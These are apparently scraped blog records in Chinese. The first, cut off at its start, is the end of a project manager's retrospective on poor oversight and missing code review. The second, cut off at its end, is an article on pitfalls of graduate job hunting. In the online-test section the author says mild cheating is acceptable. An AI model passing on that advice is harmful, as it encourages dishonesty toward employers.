id=\"既要给予信任也要保持警惕\">既要给予信任，也要保持警惕</h4>\n<p>项目中的三名成员，都是合格的开发，对使用的框架非常熟悉。其中两名还是基础版本开发成员，对需求也很熟悉。所以项目中，我放心的把整个项目交给了他们。基于对他们的放心，加上其他项目事情繁杂，对此项目关注度，对他们的关注度就不够了。</p>\n<p>我在项目中给予了他们非常充分的信任，信任他们可以把一切事情都做好。但我没有在正确的时候给予他们正确的指引，项目中出现的困难点，我也没有帮助他们解决，甚至于没有给出思路。所有的一切，都靠他们自己完成。我在这个项目里做的，就是对接客户，催进度。再无第三件事。</p>\n<p><strong><em>反思：</em></strong></p>\n<p>1.不论什么原因，都要关注到项目成员的状态<br>\n2.给予信任没错，但也要适当保持警惕，他们多少会因为经验问题疏忽遗漏一些问题<br>\n3.给予信任，也要给予帮助，不以时间为理由推脱你应该对他们进行的指点和帮助。毕竟现在剩下来一分钟，以后要花一个小时去弥补</p>\n<h4 id=\"若无法全局掌控就指派专人负责\">若无法全局掌控，就指派专人负责</h4>\n<p>这是我在项目中做的最错误的地方。</p>\n<p>由于种种原因，我无法掌握到项目的每个要点和细节。而项目中有三个开发。我并没指明其中某一个来负责整个项目，所有事情都让他们自己商量。从客户对接来的问题，我也是仅告知对应的开发。整个项目中，没有一个人对项目中的每个要点了如指掌。</p>\n<p><strong><em>反思：</em></strong></p>\n<p>1.手里捏着管理的权利，却没有做到管理的事情。是我在这个项目里最大的问题<br>\n2.授权！授权！授权！如果自己无法亲力亲为投入项目管理工作，就授权给团队某个成员管理权限，让他代替你去做管理工作<br>\n3.管理一人，总比管理多个人轻松，也更有效</p>\n<h4 id=\"要控制需求更要控制流程\">要控制需求，更要控制流程</h4>\n<p>项目是二次开发、成员对项目很熟悉、项目工作量不大、时间紧。</p>\n<p>基于以上原因，我掉以轻心，没有在项目初期进行项目的设计和规划，未指定任何开发规范。仅仅告诉开发的同事要多复用，也未检查他们是否真的复用了。</p>\n<p>项目开发中的需求变更，客户反馈意见，我我都仅仅是告知他们一声，未做详细的修改规划，所有事情都靠嘴说，所有变动都放在了我和他们的脑子里。</p>\n<p>对项目上心程度不够，未对客户的需求变更做控制和管理。所有变更都压给了开发的同事。</p>\n<p>整个项目以及其不规范的方式在运行，我也未在其中起到控制作用，项目开发一团乱麻。</p>\n<p><strong><em>反思：</em></strong></p>\n<p>1.不做设计，不进开发<br>\n2.以管理工具指导开发进行，开发过程中所有变更、反馈做记录<br>\n3.控制需求变更，拒绝不合理的需求<br>\n4.需求变更规范化操作，统一变更，而不是直接压给开发</p>\n<h4 id=\"无论什么情况下都要进行code-review\">无论什么情况下，都要进行code review</h4>\n<p>整个项目过去了几乎四个月，我仅仅花了两个多小时简单看了下代码，未指出代码的任何问题。这也导致出问题后来我花了成倍的时间来处理code review的工作，并且项目成型后的代码修改困难。</p>\n<p>项目开发过程中，也未让开发间互相进行代码review，也没有进行代码评审会。</p>\n<p>其实代码中出现了很多问题，最后检查代码的时候，发现各种命名不规范、代码复用不到位、简单逻辑复杂写等等。而这些问题，很大一部分都是早期未做规定，未指定人负责项目、未进行早期code review造成的。开发各自为战，难免造成代码问题。</p>\n<p>代码质量的问题，淋漓尽致的体现的在项目中，项目中的诸多bug，都是因为代码不规范引起的。甚至于开发人员自己对自己写过的东西，都有些拎不清了。</p>\n<p><strong><em>反思：</em></strong></p>\n<p>1.代码质量非常重要，代码越规范bug越少<br>\n2.代码互评能让开发更注重自己代码的质量<br>\n3.code review非常有必要，越早期的code review越能有效的节省后期的时间</p>\n<h2 id=\"我在其中占有多重的因素\">我在其中占有多重的因素</h2>\n<p><strong><em>100%</em></strong></p>\n<h2 id=\"我怎么填坑的\">我怎么填坑的</h2>\n<p>项目上线，问题频出，用户不满。花了8天时间来处理这个问题。幸亏项目不大，我一个人也能够挽回。</p>\n<p>目前暂时解决完毕，我简单说一下我是怎么填坑的：</p>\n<p>1.和开发主流程的同事详细熟悉了所有需求要点<br>\n2.基于我对项目需求的熟悉，我花了三天把所有主流程的所有代码分析完毕，做出了我认为应该的修改，并实施部署到生产环境测试（这是在给开着的飞机换引擎，但需要U盾才能测试，仅有生产环境的机器有U盾，别无他法）<br>\n3.每天花超过12个小时来进行code review 和修改，几乎每天code review + 修改到凌晨2点多（仅修改了问题较大且影响较小的地方。小问题未修改、牵涉面较广的地方未修改）<br>\n4.每次上班时间的修改让开发同事坐在旁边和我一起进行，我进行修改，开发同事在一旁监督。确保我不出错<br>\n5.优化功能点，把我发现的提示问题，和优化点都同步修改进代码中，确保用户体验不要太糟，以期能挽回一些用户心态</p>\n<h2 id=\"我所吸取的教训总结\">我所吸取的教训总结</h2>\n<p>1.先设计，后开发<br>\n2.管理权下放，项目中必须有人全身心负责<br>\n3.无论什么情况都要进行code review<br>\n4.压缩质量得到的进度保证不可取，开发周期不合理决不答应客户。否则坑了自己坑了同事，更坑了客户</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"107390\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"107390votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"107390\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 7 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/lxtalx\">zer0Black</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/lxtalx\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2016/02/7345325ae6842e24247f60a113f61ce3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            目前工作为移动开发，兴趣广泛，计算机各方面均有强烈兴趣。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/lxtalx\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/lxtalx/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/lxtalx/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 26</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/u/1851062185\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/158533223be951655a2f62a70168e5e8fc06b8cc.jpg"}
{"title": "程序员找工作面试会遇到哪些坑", "url": "http://blog.jobbole.com/114356/", "create_date": "2018/09/05", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/4a043f41f5b2e7764b45919c95078c9f.jpg"], "url_object_id": "ea46fc75323a3de344ba044d58228ce7", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "职场,面试", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/smyhvae/p/9587950.html\">千古壹号</a>   </div><div id=\"cnblogs_post_body\">\n<h2 id=\"前言\">前言</h2>\n<p>我在JD工作已经有四个多月了，加班一直都比较多，不是因为工作量太大，而是因为自己不会的东西太多。电商行业的确是一个很锻炼人的地方。</p>\n<p>2018年4月份，我写的那篇文章《<a href=\"https://www.cnblogs.com/smyhvae/p/8732781.html\">裸辞两个月，海投一个月，从Android转战Web前端的求职之路</a>》，引起了很多同学的共鸣，甚至有几位同学留言说他们连续看了好几遍。这就让我诞生了一个想法：<strong>集中写一些和“职场”有关的文章</strong>。</p>\n<p>先简单介绍一下我的个人履历：我于2013年6月毕业于一个很普通的二本学校，2016年6月毕业于电子科技大学（985院校）。从学校毕业后，我的第一份工作是在一家不大不小的公司写代码。2018年4月，我来到JD工作，继续写代码，但是换了一个方向，几乎是从零开始积累。</p>\n<p>我经历过<strong>普通学校</strong>找工作时的无助，也经历过<strong>名校</strong>找工作时的各种大好机会。我经历过校招，也经历过社招。</p>\n<p>校招和社招的区别还是很大的，我准备分两篇文章来写。就比如，一个最典型的区别是：</p>\n<ul>\n<li>校招：公司全国各地跑，去学校招人。</li>\n<li>社招：求职者全国各地跑，去公司面试。</li>\n</ul>\n<p>今天这篇文章，我们就来聊一聊<strong>校招找工作时</strong>会遇到哪些坑。需要注意的是，这些坑不一定是用人单位让我们踩的，也有可能是我们自己给自己挖的坑。而最大的坑就是：我们什么都没做，不闻不问，让机会悄悄溜走。</p>\n<h2 id=\"找工作的最佳时间\">找工作的最佳时间</h2>\n<p>如果你现在在上大学，找工作的最佳时间，应该是大四上学期。也就是说，大三暑假这两个月，你要开始好好规划、好好准备了。如果找到比较满意的工作，可以考虑毕业前去实习。</p>\n<p>如果你现在在读研（学制一般是三年），找工作的最佳时间，是研三的9月份和10月份。也就是说，研二暑假的这两个月，你一定要多去图书馆，提升自己。</p>\n<p>当然，有些大公司会很早就开始招实习生，如果你有意向，也要尽早关注和准备。</p>\n<p>总而言之，校招找工作前，请一定利用好暑假那两个月的黄金时期，做一些功课，提升专业技能。可能会有些同学会利用暑假的时间做家教、学驾照等，具体怎么安排需要你们自己去权衡。我只提醒一点：临近毕业，没有什么是比你们的前程更重要的。错过了，就是一辈子。</p>\n<p>我猜，应该有一部分同学， 临近毕业的时候，还没有找到工作。如果是这种情况，我给不了什么建议，但有一点可以确定的是：<strong>请一定利用好在校期间的求职机会。如果等到毕业之后再找工作，将会非常艰难，要求也会非常高</strong>，因为那个时候，你走的不再是校招渠道，而是社招渠道，到时候你的竞争对象可是全国人民。</p>\n<h2 id=\"选哪个城市\">选哪个城市</h2>\n<p>找工作前，很多问题要想清楚，不要盲目找。首先要想清楚的是：毕业后你打算去哪个城市发展。</p>\n<p>就业机会、工资、房价、和妹子异地等等，这些都是需要去权衡的因素。至于何去何从，只有你自己能决定。</p>\n<p>就拿互联网行业的就业机会来举例，北京的互联网公司数量，占据了全国互联网公司数量的一半以上。看看下面这张图就知道了：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/1349bf290aaa542c51c327323218744a.png\"></p>\n<h2 id=\"要投递什么岗位\">要投递什么岗位</h2>\n<p>大学里，有一些专业，毕业后是不太好找工作的，导致很多女生毕业后去做了微商。</p>\n<p>说到岗位，谈一下我所熟悉的互联网公司。如果你想进互联网公司，不一定要做程序员，其他岗位你可以考虑下，比如：产品、运营、测试等。这些岗位，在学校都是没有对应的专业的。需要的是你做出改变的勇气，并踏出第一步。</p>\n<h2 id=\"校招面试有哪些环节\">校招面试有哪些环节</h2>\n<p>一般来说，面试的流程分为：<strong>官网投简历、宣讲会、笔试、面试、offer发放</strong>。现在，我来逐一阐述。</p>\n<p><strong>投简历</strong>：</p>\n<p>大公司的校园招聘信息、流程、时间节点，一般都会在公司的官网挂出来。投简历时，我们只需按照上面的提示，进入指定的系统进行操作即可。比如腾讯校园招聘的官网是长这样的：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/2f1e03af220f9606e9bbe740f7a1462b.png\"></p>\n<p>小公司的校园招聘信息，一般会挂在其他的聚合类网站上（比如学校的招聘网站、第三方的招聘网站等）。当然，我建议你，无论公司大小，都要去公司的官网瞧一眼。</p>\n<p><strong>宣讲会</strong>：</p>\n<p>企业去一个城市招人时，一般会先去学校举办一场宣讲会，给公司做做推广和宣传，说白了就是打广告。就拿四川的成都市来举例，成都市的高校数量，少说也有十几个，企业会在每个学校开宣讲会吗？当然不会。一般会首选电子科大学和四川大学，稍微有点情怀的企业，会再考虑一下西南交通大学。</p>\n<p>宣讲会一定要参加吗？答案是：如果你有空，就去参加；如果你没空，可以不去。有一点要注意：别错过笔试和面试的时间就好。</p>\n<p>参加宣讲会，只会让你对那家公司更加蠢蠢欲动，并不会增加你面试成功的概率。因为所有公司的宣讲会都是报喜不报忧，甚至有很多夸大其词的成分。</p>\n<p>我个人认为，企业在宣讲会上把公司夸得天花乱坠并不是什么好现象。当毕业生工作一段时间后，对所在公司的评价一般都是：“还行吧，就那样”，这个时候再想想自己曾经满怀期待参加过的那场宣讲会，难免会有一些心理落差。</p>\n<p><strong>笔试</strong>：</p>\n<p>有些公司的笔试会安排在学校的教室里，也有一些公司是<strong>在线笔试</strong>的形式。稍微大一点的互联网公司，基本都是在线笔试。</p>\n<p>所谓在线笔试，指的是：你在宿舍里打开电脑，开启电脑的摄像头，在指定的网站上做题目。</p>\n<p>有同学可能会问，在线笔试肯定很容易作弊吧？答案是肯定的。但是，作为应聘者，最重要的一条考核指标就是<strong>诚信第一</strong>。就算你以作弊的形式通过了笔试，可如果在面试环节，面试官问你：“你之前参加的笔试题目，给我讲一下你是怎么做出来的？”这很容易就看出你的水平和诚信问题了。所以说，轻微地作弊没有太大影响，但不要太过分就行了。</p>\n<p>温馨提示一下，笔试这个环节，至少会刷掉一半的人。如果你参加完笔试，发现自己很多题目都不会做，不要犹豫，赶紧准备下一家。</p>\n<p><strong>心理测试/行测题</strong>：</p>\n<p>在安排笔试 or面试之前，很多公司会首先要求你做一套<strong>心理测试题</strong>或者是<strong>行测题</strong>。这个环节，一般都不会刷人，如果遇到不会做的题目，网上基本也能找到答案。</p>\n<p>但有一些公司的心理测试题是具有一票否决权的。也就是说，就算你的笔试和面试的表现再好，可如果心理测试没通过，不好意思，你被刷了。</p>\n<p>比如华为公司在这一环节进行大量刷人，是出了名的。不少同学参加完华为的心理测试题，自我感觉良好，最后还是莫名其妙被刷。比如深圳的大疆公司，也会在这一环节刷掉一大批人。如果被刷，不要气馁，并不是你心理有问题，只能说，你与该公司的价值观不符，不如另谋高就。</p>\n<p><strong>面试</strong>：</p>\n<p>面试一般会安排在酒店进行。这个环节应该是最辛苦的，因为你要起得很早，坐公交地铁去市区，一天跑好几趟。你舍不得打车去，因为花了几十块钱赶到面试现场，最后只面了几分钟就完事，这种感觉是很失落的。</p>\n<p>面试请尽量不要迟到，如果和别的面试冲突了，建议提前联系 hr ，商量一下，另行约定时间，hr一般都会同意。联系hr时，建议先发短信，如果没有回复，再电话联系。</p>\n<p><strong>offer发放</strong>：</p>\n<p>如果你拿到了offer，那一定要以offer邮件为准。邮件上至少需要注明：月薪是多少、社保和公积金的缴纳基数和比例是多少。如果你接手offer，就可以开始签三方了。</p>\n<p>有些公司的hr可能会这样说：“恭喜你通过我们公司的面试，需要你马上过来签合同；否则，机会就留给别人了。”这个时候，你要好好斟酌一下机会成本。</p>\n<p>最后总结一句：一定不要错过各个面试环节的<strong>时间节点</strong>。</p>\n<h2 id=\"我们要做哪些准备工作\">我们要做哪些准备工作</h2>\n<p>针对每一次面试，我们要做到「有备而来」。</p>\n<h3 id=\"准备一段自我介绍\">准备一段自我介绍</h3>\n<p>毫无疑问，每一次面试，面试官问的第一个问题一定是：“你先做一段自我介绍”。假设一家公司有三轮面试，你估计要讲三遍自我介绍。</p>\n<p>根据我的经验来看，你完全可以提前准备一段自我介绍的<strong>模板</strong>，以后只要面试官问你该问题，你就这么回答。这是完全ok的。</p>\n<p>但是，自我介绍的模板一定要认真准备。你需要准备一段适合你自己的、为你自己量身定做的、符合你个人特点的模板，而且要走心。你有什么优势、有什么不足、有什么话你觉得可以让面试官眼前一亮的，都可以放到模板里。</p>\n<h3 id=\"把需要投递的公司在表格上记录下来\">把需要投递的公司，在表格上记录下来</h3>\n<p>校招时，我们每天都会不停地往各大网站投简历、填资料，这种操作称之为<strong>海投</strong>。时间一久，哪些公司你投过简历，根本就不记得。所以，最好是用表格把每个公司记录整理下来，表格里至少要包含如下信息：</p>\n<ul>\n<li>公司名称</li>\n<li>公司网址</li>\n<li>投递的网址、投递账号</li>\n<li>笔试、面试时间</li>\n<li>我当前的面试进展</li>\n</ul>\n<h3 id=\"把将要面试的公司做一个-todo-list\">把将要面试的公司，做一个 todo list</h3>\n<p>如果你今天有两个面试、明天有三个面试，难道面试的时间都要记在脑子里么？当然不是，我建议你列一个 todo list（待办事项）。比如，我当初参加校招时，是这样列出来的：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/48964a86d1f82e7d54656d585eeb0f7f.jpg\"></p>\n<h2 id=\"校招找工作有哪些渠道\">校招找工作有哪些渠道</h2>\n<h3 id=\"各大公司的官网\">各大公司的官网</h3>\n<p>在向一个公司投简历之前，你需要做的第一件事，就是去看该公司的官网。大公司的校招信息，一定会首发在官网上。</p>\n<h3 id=\"第三方的招聘网站\">第三方的招聘网站</h3>\n<p>有些小公司可能没有网站，就算有网站，也是常年不更新。这些公司的招聘信息，一般会发布在第三方的招聘网站上。我所知道的常见网站有以下几个：</p>\n<ul>\n<li>大街网：www.dajie.com</li>\n<li>牛客网：www.nowcoder.com。牛客网上发布的招聘信息以互联网公司为主。</li>\n</ul>\n<h3 id=\"内推\">内推</h3>\n<p>我的上一篇文章，被读者问的最多的一个问题是：我是哪里找来的这么多的内推渠道。答案是：我都是找的校友。</p>\n<p>内推指的是“内部推荐”。比如说，我在京东上班，你可以直接把简历发给我，我再把你的简历转发给公司的hr。hr看了简历之后，如果满意，就会直接通知你来面试。</p>\n<p>有些童鞋可能会有疑问：“如果其他同学都走内推渠道了，那对于那些正常走校招渠道人来说，也太不公平了吧？”如果你有这种想法，那就大错特错了。当你去追求公平的时候，就已经输了。</p>\n<p>实质上，内推是有大大的好处的，我来给你分析下：</p>\n<p>从应聘者的角度讲，内推流程会快很多，可以省去漫长的校招流程。况且，如果内推没通过，可以继续走校招流程，二者并不冲突。</p>\n<p>从公司的角度讲，可以省去一大把筛选简历的时间。茫茫人海，简历多如牛毛，如果逐一筛选，实在是没有这个时间和精力，很容易漏掉有才华的人。一般来说，公司员工内推的简历，质量也不会太差。举个例子，小明毕业于电子科技大学，毕业后去BAT上班，小明给公司内推的简历，大部分都是来自电子科技大学的校友。所以说，内推的简历，整体质量都是比较高的。</p>\n<p>从小明的角度来讲，他如果把别人内推成功了，小明自己也会获得“伯乐奖”。</p>\n<p>千里马常有，而伯乐不常有。内推，会让hr在人群中多看你一眼。</p>\n<p>从上面的分析中，可以看出：毕业于一所好的大学，别的优势先不说，但至少会让你拥有重要的资源、环境、人脉。</p>\n<p>需要提醒你的是，内推渠道一般会比正式的校招渠道要早。如果你觉得自己的能力还不够，就不要去找别人内推凑热闹。有这个时间，还不如好好复习，准备校招面试。</p>\n<h2 id=\"是去大公司还是小公司\">是去大公司还是小公司</h2>\n<p>校招，毫无疑问，一定是优先考虑大公司。大公司的优势非常多，这一点，我以后准备专门写一篇文章。</p>\n<p>人生的第一份工作是很重要的。如果你去了一个毫不起眼的小公司，等你下次跳槽的时候，几乎没啥优势可言，除非你的能力非常强。但如果你的第一份工作是在大公司，以后跳槽的时候，你就是被别人捧在手心的宝贝。当然，我这么说，并不是鼓励大家跳槽，而是让大家明白：让自己升值，很重要。当你处在一家大公司的时候，你就已经升值了。</p>\n<p>关于“大公司与小公司的区别”，不少在校大学生，听过的最多的一句话是：“在大公司打工，你只是做一颗螺丝钉，发挥不了太大的作用；在小公司工作，你的综合能力会得到很好的锻炼”。在我看来，这句话是完全扯淡的。</p>\n<p>任何一项庞大的工程，本来就是分工协作的，你可以今天当螺丝钉，明天当螺丝帽，综合能力一样可以得到体现。</p>\n<p>我不鼓励应届生去小公司，主要是因为：很多小公司都比较坑，会通过各种手段损害、压榨员工的利益（具体内容我就不详细说了）。这种公司只能用三个字来形容：不靠谱。</p>\n<p>不少学生可能会有这样的期待：“我希望加入一家小公司，与公司一同成长。”如果你有这种想法，说明你还太年轻。据统计，92%的创业公司，活不过三年。你以为，在中关村摆个柜台，十年之后，就可以成为第二个刘强东么？</p>\n<p>当然了，有些情况，需要特殊考虑。举几个例子：</p>\n<p>比如说，小公司看中了你的能力，专门以高薪挖你过去，这个时候，你确实可以考虑一下。每一家成功的创业公司，一开始都是靠几个有非凡梦想、非凡能力的人撑起来的。阿里巴巴当初创业的时候，不也是有十八罗汉么？</p>\n<p>比如说，你拿到了两个offer：一家大公司、一家小公司。大公司是国企，据说在里面待着会比较闲，能力得不到提升。这个时候可以考虑去小公司，或者继续找其他的工作。</p>\n<p>比如说，你作为一个有梦想的热血青年，想去创业，那当然是应该值得鼓励的。</p>\n<p>充满期望、蒸蒸日上的小公司有吗？当然有，但比例很少。如果你想冒险一试，我不反对。</p>\n<p><strong>总结一下</strong>：如果你是像大部分人一样，是去给资本家打工的，请优先考虑大公司。</p>\n<h2 id=\"用人单位会有哪些坑\">用人单位会有哪些坑</h2>\n<p>用人单位的坑是很多的，尤其是在社招的时候，有非常非常多的坑。不过，本文讲的是校招，我就大概列举几条。</p>\n<h3 id=\"没有官方网站的公司要慎重\">没有官方网站的公司，要慎重</h3>\n<p>面试一家公司之前，要先了解一下该公司的基本介绍、公司所做的产品和服务、公司的成立时间、公司的人员规模、公司的办公地址等，另外还要了解公司的业绩和发展前景。这是作为求职者最基本的常识。</p>\n<p>为了清楚以上这些信息，我们首先应该想到的是：去该公司的官网看看。如果这家公司没有官网，那就一定要慎重。</p>\n<p>其次，我们还要去「国家企业信用信息公示系统」上查一下公司的基本信息，网址是：</p>\n<blockquote><p><a href=\"http://www.gsxt.gov.cn/\">http://www.gsxt.gov.cn/</a></p></blockquote>\n<p>上面这个网站，打开后的界面如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/3a3976342fae51347b55ff1f9e6a7be1.png\"></p>\n<p>通过这个网站，我们可以查到任何一家公司的基本信息：（成立时间、法定代表人等）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/73c8522391338c9c8ec075909df4660a.png\"></p>\n<p>如果你在上面这个网站上没有找到某公司的信息，放心吧，这个公司一定是个骗子。</p>\n<p>另外，我们还可以去其他的第三方网站上查某公司的更多信息，在此推荐几个网站给大家，方便大家查询各种公司的各种信息：</p>\n<ul>\n<li>天眼查：www.tianyancha.com</li>\n<li>企查查：www.qichacha.com</li>\n<li>看准网：www.kanzhun.com</li>\n</ul>\n<p>有些小公司会跟你说：“试用期期间，会安排你去另外一个地方集中培训几个月，你甚至要先交点钱。”这个时候你要注意了，这很有可能是一个传销组织。之前在各大招聘网站上，发生过很多求职者被骗的例子。比如下面这条新闻，可是震惊大江南北的：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/20bbf0cfd73920b10e2fe9ed89e10b94.png\"></p>\n<h3 id=\"有些公司只是来做宣传的\">有些公司只是来做宣传的</h3>\n<p>有些公司，你从来就没听说过他的名字，或者说，你从来没有听说过该公司的产品。但是在宣讲会上，这些公司却把自己夸的天花乱坠。放心吧，这些公司基本不是来招人的，而是来做宣传的。你参加了这个公司的笔试题，然后就不会有下文了。</p>\n<p>但是应聘者的时间是很宝贵的，参加了这个公司的笔试，也许就错过了另外一家公司的机会。所以说，你自己要好好权衡。</p>\n<h3 id=\"毕业前签约毕业后毁约\">毕业前签约，毕业后毁约</h3>\n<p>有些公司是挺搞笑的，你毕业前，公司和你签约了；等你毕业后，公司马上和你毁约，甩掉你。</p>\n<p>大公司一般不会这么做，有损公司名誉，就算这么做，好歹也是等你工作几个月再裁掉你（比如酷派公司在2017年就对应届生这么干过）。</p>\n<p>给大家举一个真实的例子：</p>\n<p>我当初在读大四的时候，有一家本地的刚成立的小公司来我们学院疯狂招人，光是我们班，就招了近10个过去。辅导员甚至鼓励学生们去那家公司。</p>\n<p>辅导员当时乐开了花，恨不得那些没找到工作的学生，都去跟这个公司签合同。为什么这么说呢？如果大家都有工作了，那学生的就业率就是100%，辅导员的业绩和指标就上去了。我非常清楚的记得，合同签完之后，那家公司的老板请辅导员和学生们大吃大喝了一顿。</p>\n<p>最后的结果是什么样子呢？毕业之后，那家公司把招到的学生全部辞退了，因为公司的工厂都还没建好，又怎么可能还招人干活呢？</p>\n<p>那些学生怎么办呢？只能各回各家，各找各妈。学校和辅导员只关心学生们<strong>在校期间</strong>的就业率，等你一毕业，就跟学校没有关系了。</p>\n<p>所以说，我的建议是：一些小公司，尤其是那种刚成立不久的公司，应届生一定要慎重。就怕你到时候不仅没工作，而且也错过了找其他工作的时机，上哪儿哭去？</p>\n<h3 id=\"社保和公积金\">社保和公积金</h3>\n<p>社保和公积金这部分，也是个大坑。你一定要了解清楚。</p>\n<p>社保一般由五个部分组成：养老、医疗、失业、工伤、生育。</p>\n<p>应届生们一般只关心的问题是“公司会不会交社保和公积金”。但这远远不够，你更应该关心的是“交的基数和比例”。</p>\n<p>给大家举个我自己的例子：</p>\n<p>我毕业之后，第一份工作是在 <strong>H公司</strong>（公司的名字先这么叫着） ，给我的月薪是 <strong>1W</strong>（这不是我的真实工资，我只是为了方便给大家打比方，但缴纳的比例是真实的）。这1W的月薪，是这么组成的：</p>\n<ul>\n<li>基本工资 5000元 （这同样也是我缴纳社保、公积金的基数）</li>\n<li>绩效工资 4000元（绩效工资每个月都会给满）</li>\n<li>房补 1000元</li>\n</ul>\n<p>当时拿到offer的时候，公司说从试用期开始就会给我交社保，于是我也就安心了。当我拿到第一个月的工资时，我才发现 H公司 是多么的抠门：</p>\n<ul>\n<li>医保每月共缴纳 40元。包括：公司缴纳 5000 * 0.6% = 30元，个人缴纳 5000 * 0.2% = 10元。而且缴纳的是深圳市二档医保。普通门诊是无法报销的。</li>\n<li>公积金每月共缴纳 500元。包括：公司缴纳 5000 * 5% = 250元，个人缴纳 5000 * 5% = 250元。</li>\n</ul>\n<p>等我来到了 JD公司工作，公司每月给我缴纳的医保和公积金情况是这样的：（同理，这个基数不是我真实的工资和基数，我只是为了方便给大家打比方，但缴纳的比例是真实的）</p>\n<ul>\n<li>医保每月共缴纳 2100元。包括：公司缴纳 10000 * 13% = 1300元，个人缴纳 10000 * 8% = 800元。而且缴纳的是深圳市一档医保，普通门诊可以报销。</li>\n<li>公积金每月共缴纳 2400元。包括：公司缴纳 10000 * 12% = 1200元，个人缴纳 10000 * 12% = 1200元。</li>\n</ul>\n<p>把 H公司 和 JD公司 对比一下，你会发现：H公司缴纳的基数和比例很少。每个员工少缴纳几千，再乘以员工总人数，这样算下来，H公司 能省一大笔钱。</p>\n<p>我想，我已经讲得够清楚了吧？</p>\n<h2 id=\"关于培训机构\">关于培训机构</h2>\n<p>前几年，互联网行业如井喷式发展，连猪都能飞起来，互联网行业的工作也随之热门起来。大家听说互联网的工资高，于是纷纷涌进来。</p>\n<p>工资高是真的，但加班疯狂也是真的。</p>\n<p>我知道，很多非计算机专业的学生，为了学编程写代码，会花半年的时间，交几万块钱，去参加线下的培训班。如果你现在还有这种想法和行为，我的建议是：请三思、请慎重。</p>\n<p>首先，程序员这个岗位的学习成本和难度并不低，你要考虑一下写代码是否真的适合自己。很多时候，你觉得自己对某个东西感兴趣，是因为不了解。</p>\n<p>其次，你参加了培训班之后，再去找工作，我猜你在简历上保证不敢说自己参加过培训班。因为，现在很多公司招人，对培训班出来的学生是比较抵触的，这些学生只是为了速成，计算机基础的底子太差。</p>\n<p>不少培训机构说：“只要你来参加我的培训班，我保证给你推荐就业”。这句承诺基本是骗人的。会不会给你推荐就业我不知道，但培训机构的老师教你<strong>简历造假</strong>，是常有的事。</p>\n<p>再次，如果你真的一点基础都没有，直接去参加线下的培训班，节奏肯定是肯快的，你估计适应不了。还不如买一些线上的视频来自学，自己在家里看，想暂停就暂停，还可以倍速播放。我看慕课网上的IT视频，质量都挺高（慕课网的同学看到后请自觉赞赏）。当然了，看线上视频自学，你得有很好的自制力才行。</p>\n<p>最后，如今的经济形势不太好，很多互联网公司都抱团取暖，互联网的岗位显然是僧多粥少。而最大的问题在于：很多程序员只是处于入门的水平，真正有水平的程序员太少了。</p>\n<h2 id=\"关于考研\">关于考研</h2>\n<p>不要一边考研一边找工作。如果同时做两手准备，很有可能最后两边都没有收获。</p>\n<p>是否考研，你在大三的时候就应该考虑清楚。如果你打算考研，就请专心考研，不要给自己留退路。</p>\n<p>那到底有没有必要考研，这个话题有点长，以后专门写一篇吧。</p>\n<h2 id=\"一些其他的疑问\">一些其他的疑问</h2>\n<h3 